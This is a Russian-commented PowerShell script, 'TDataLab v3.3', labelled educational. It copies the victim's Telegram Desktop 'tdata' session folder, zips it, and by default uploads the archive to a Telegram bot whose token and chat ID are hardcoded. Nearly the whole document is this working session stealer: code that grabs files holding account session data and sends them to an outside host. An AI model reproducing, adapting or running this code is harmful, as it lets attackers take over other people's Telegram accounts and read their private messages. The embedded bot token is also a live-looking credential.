<#
.SYNOPSIS
    TDataLab v3.3 — Исправленная стабильная версия
.DESCRIPTION
    Собирает доступные файлы сессии Telegram, упаковывает в ZIP и отправляет в Telegram.
    Работает в PowerShell 5.1 и выше.
.NOTES
    Версия: 3.3
    Только для образовательных целей.
#>

# ============================================================
#  НАСТРОЙКИ
# ============================================================
$script:Config = @{
    OutputDir     = "$env:USERPROFILE\Desktop"
    ZipName       = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    LogFile       = "$env:USERPROFILE\Desktop\TDataLab.log"
    TDataPath     = "$env:APPDATA\Telegram Desktop\tdata"
    TempCopyDir   = "$env:TEMP\TDATA_Temp_$(Get-Random)"

    EnableUpload  = $true
    BotToken      = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"
    ChatId        = "243855738"

    IncludeLog    = $true
}
# ============================================================

# === ЛОГГИРОВАНИЕ ===
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    Add-Content -Path $script:Config.LogFile -Value $logEntry -ErrorAction SilentlyContinue
    Write-Host $logEntry
}

# === ОТПРАВКА В TELEGRAM ===
function Send-ToTelegram {
    param([string]$FilePath, [string]$Caption = "TDataLab отчет")

    if (-not $script:Config.EnableUpload) {
        Write-Log "Отправка в Telegram отключена в настройках." "INFO"
        return $false
    }

    if ([string]::IsNullOrEmpty($script:Config.BotToken) -or $script:Config.BotToken -eq "") {
        Write-Log "Токен бота не задан. Отправка отключена." "WARN"
        return $false
    }
    if ([string]::IsNullOrEmpty($script:Config.ChatId) -or $script:Config.ChatId -eq "") {
        Write-Log "Chat ID не задан. Отправка отключена." "WARN"
        return $false
    }

    Write-Log "Пытаюсь отправить файл в Telegram..." "INFO"

    try {
        $uri = "https://api.telegram.org/bot$($script:Config.BotToken)/sendDocument"

        # Читаем файл в байты
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)

        # Создаём multipart/form-data вручную (совместимо с PS5.1)
        $boundary = "---------------------------" + (Get-Random -Maximum 99999999).ToString()
        $LF = "`r`n"

        $bodyLines = @()

        # Поле chat_id
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
        $bodyLines += ""
        $bodyLines += $script:Config.ChatId

        # Поле caption
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"caption`""
        $bodyLines += ""
        $bodyLines += $Caption

        # Поле document (файл)
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
        $bodyLines += "Content-Type: application/zip"
        $bodyLines += ""
        $bodyLines += [System.Text.Encoding]::UTF8.GetString($bytes)

        $bodyLines += "--$boundary--"
        $bodyLines += ""

        $body = [string]::Join($LF, $bodyLines)
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

        # Создаём запрос
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        $response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyBytes

        if ($response.ok) {
            Write-Log "Архив успешно отправлен в Telegram!" "INFO"
            return $true
        } else {
            Write-Log "Ошибка Telegram: $($response.description)" "ERROR"
            return $false
        }
    } catch {
        Write-Log "Исключение при отправке: $_" "ERROR"
        return $false
    }
}

# === КОПИРОВАНИЕ ДОСТУПНЫХ ФАЙЛОВ ===
function Copy-AvailableFiles {
    param([string]$SourcePath, [string]$DestPath)

    Write-Log "Копирование доступных файлов из: $SourcePath" "INFO"
    $stats = @{ Copied = 0; Skipped = 0; Errors = 0 }
    $skippedFiles = @()

    # Создаём структуру папок
    Get-ChildItem -Path $SourcePath -Directory -Recurse | ForEach-Object {
        $targetDir = $_.FullName.Replace($SourcePath, $DestPath)
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }
    }

    # Копируем каждый файл с проверкой на блокировку
    Get-ChildItem -Path $SourcePath -File -Recurse | ForEach-Object {
        $sourceFile = $_.FullName
        $relativePath = $sourceFile.Replace($SourcePath, "")
        $targetFile = $DestPath + $relativePath

        try {
            $fs = [System.IO.File]::Open($sourceFile, 'Open', 'Read', 'Read')
            $fs.Close()
            Copy-Item -Path $sourceFile -Destination $targetFile -Force -ErrorAction Stop
            $stats.Copied++
        } catch {
            $stats.Skipped++
            $skippedFiles += $relativePath
            Write-Log "ПРОПУЩЕН (заблокирован): $relativePath" "WARN"
        }
    }

    if ($skippedFiles.Count -gt 0) {
        $skipLog = "$DestPath\skipped_files.txt"
        $skippedFiles | Out-File -FilePath $skipLog
        Write-Log "Список пропущенных файлов: $skipLog" "INFO"
    }

    Write-Log "Скопировано: $($stats.Copied), Пропущено: $($stats.Skipped)" "INFO"
    return $stats
}

# === АРХИВАЦИЯ ===
function Compress-Folder {
    param([string]$SourcePath, [string]$ZipPath, [string]$LogPath)
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem

        if ($script:Config.IncludeLog -and (Test-Path $LogPath)) {
            Copy-Item -Path $LogPath -Destination "$SourcePath\TDataLab.log" -Force
            Write-Log "Лог скопирован в архив" "INFO"
        }

        [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $ZipPath)
        Write-Log "Архив создан: $ZipPath" "INFO"
        return $true
    } catch {
        Write-Log "Ошибка создания архива: $_" "ERROR"
        return $false
    }
}

# === ОЧИСТКА ===
function Cleanup {
    param([string]$Path)
    if (Test-Path $Path) {
        Remove-Item $Path -Recurse -Force
        Write-Log "Временная папка удалена: $Path" "INFO"
    }
}

# === ГЛАВНЫЙ ПРОЦЕСС ===
function Start-TDataLab {
    Write-Log "=========================================" "INFO"
    Write-Log "TDataLab v3.3 запущен." "INFO"
    Write-Log "=========================================" "INFO"

    $tdataPath = $script:Config.TDataPath
    if (-not (Test-Path $tdataPath)) {
        Write-Log "Папка tdata не найдена." "ERROR"
        return
    }

    $tempCopy = $script:Config.TempCopyDir
    if (Test-Path $tempCopy) { Remove-Item $tempCopy -Recurse -Force }
    New-Item -ItemType Directory -Path $tempCopy -Force | Out-Null
    Write-Log "Временная папка: $tempCopy" "INFO"

    $result = Copy-AvailableFiles -SourcePath $tdataPath -DestPath $tempCopy
    if ($result.Copied -eq 0) {
        Write-Log "Не скопировано ни одного файла." "ERROR"
        Cleanup -Path $tempCopy
        return
    }

    $zipFullPath = Join-Path $script:Config.OutputDir $script:Config.ZipName
    $compressOk = Compress-Folder -SourcePath $tempCopy -ZipPath $zipFullPath -LogPath $script:Config.LogFile

    Cleanup -Path $tempCopy

    if ($compressOk) {
        Write-Log "=========================================" "INFO"
        Write-Log "Архив создан: $zipFullPath" "INFO"
        Write-Log "Скопировано: $($result.Copied) файлов" "INFO"
        Write-Log "Пропущено: $($result.Skipped) файлов" "WARN"
        Write-Log "=========================================" "INFO"

        if ($script:Config.EnableUpload) {
            $caption = "TDataLab от $(Get-Date -Format 'yyyy-MM-dd HH:mm')`nСкопировано: $($result.Copied)`nПропущено: $($result.Skipped)"
            Send-ToTelegram -FilePath $zipFullPath -Caption $caption
        }
    } else {
        Write-Log "Ошибка архивации." "ERROR"
    }
}

Start-TDataLab
